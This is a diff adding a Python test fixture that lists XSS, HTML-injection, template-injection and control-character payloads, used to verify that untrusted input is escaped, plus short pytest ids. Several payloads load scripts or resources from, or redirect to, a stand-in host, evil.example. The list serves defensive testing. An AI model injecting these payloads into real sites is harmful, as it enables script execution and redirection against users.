@@ -1,0 +1,50 @@
+"""Hostile strings used to test that nothing untrusted can become markup or script."""
+
+PAYLOADS = [
+    "<script>alert(1)</script>",
+    "<SCRIPT SRC=//evil.example/x.js></SCRIPT>",
+    '"><script>alert(1)</script>',
+    "'><img src=x onerror=alert(1)>",
+    "<img src=x onerror=alert(1)>",
+    "<svg onload=alert(1)>",
+    "<svg><script>alert(1)</script></svg>",
+    "<iframe src=javascript:alert(1)></iframe>",
+    "<a href=\"javascript:alert(1)\">click</a>",
+    "javascript:alert(1)",
+    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
+    "</pre><script>alert(1)</script>",
+    "</title><script>alert(1)</script>",
+    "</textarea></td></tr></table><script>alert(1)</script>",
+    "<!-- comment --><b>bold</b>",
+    "<![CDATA[ x ]]>",
+    "<style>body{display:none}</style>",
+    "<meta http-equiv=refresh content='0;url=//evil.example'>",
+    "<base href=//evil.example/>",
+    "<link rel=stylesheet href=//evil.example/x.css>",
+    "<form action=//evil.example><input name=x></form>",
+    "<object data=//evil.example/x.swf></object>",
+    "<math><mi xlink:href=javascript:alert(1)>x</mi></math>",
+    "x\" onmouseover=\"alert(1)\" y=\"",
+    "x' onfocus='alert(1)' autofocus='",
+    "x` onerror=`alert(1)`",
+    "&lt;script&gt;alert(1)&lt;/script&gt;",
+    "&#60;script&#62;alert(1)&#60;/script&#62;",
+    "%3Cscript%3Ealert(1)%3C/script%3E",
+    "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+    "{{7*7}} ${7*7} <%= 7*7 %>",
+    "\x00<script>alert(1)</script>",
+    "\x1b[2J\x1b]0;pwned\x07",
+    "bidi \u202e<script>alert(1)</script>\u202c",
+    "line1\nline2\r\nline3\u2028line4\u2029",
+    "\ufeff<img src=x onerror=alert(1)>",
+    "<img\nsrc=x\nonerror=alert(1)>",
+    "<img/src=x/onerror=alert(1)>",
+    "<<script>alert(1);//<</script>",
+    "\">< / ' ` & < > \"",
+    "a" * 50_000 + "<script>",
+]
+
+
+# Short explicit ids: pytest otherwise puts the whole payload into the test name, and on Windows a test
+# name over 32,767 characters cannot be stored in an environment variable, which crashes the run.
+PAYLOAD_IDS = [f"payload{i:03d}" for i in range(len(PAYLOADS))]
